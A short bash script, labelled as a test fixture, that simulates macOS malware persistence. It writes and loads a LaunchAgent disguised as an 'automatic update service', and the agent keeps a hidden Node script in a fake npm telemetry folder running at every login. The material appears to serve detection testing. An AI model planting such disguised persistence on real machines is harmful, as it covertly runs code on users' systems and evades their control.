#!/bin/bash
# TEST FIXTURE — NOT REAL MALWARE
# Simulates macOS persistence via LaunchAgent

echo "Installing automatic update service..."

mkdir -p ~/Library/LaunchAgents
cat > ~/Library/LaunchAgents/com.dev.updater.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.dev.updater</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/bin/node</string>
    <string>~/.cache/.npm_telemetry/monitor.js</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict>
</plist>
EOF

launchctl load ~/Library/LaunchAgents/com.dev.updater.plist

echo "Update service installed."
